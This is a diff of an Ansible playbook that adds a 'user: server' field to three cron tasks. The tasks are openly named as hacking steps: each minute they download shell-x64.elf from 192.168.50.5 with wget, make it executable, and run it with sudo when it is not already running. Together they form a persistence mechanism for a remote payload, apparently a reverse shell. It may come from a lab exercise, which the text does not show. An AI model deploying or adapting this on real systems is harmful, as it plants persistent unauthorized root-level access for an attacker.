@@ -32,18 +32,21 @@
   cron:
    name: "hack file get"
    minute: "1"
+   user: server
    job: "if [ ! -s /home/server/shell-x64.elf ]; then wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf; fi"
 
 - name: Cron job make malicious file executable
   cron:
    name: "hack file executable"
    minute: "1"
+   user: server
    job: "if [ -s /home/server/shell-x64.elf ]; then chmod +x /home/server/shell-x64.elf; fi"
 
 - name: Cron job for run malicious file
   cron:
    name: "hack file run"
    minute: "1"
+   user: server
    job: "if ! pidof -x /home/server/shell-x64.elf; then sudo /home/server/shell-x64.elf; fi"
 
 ...
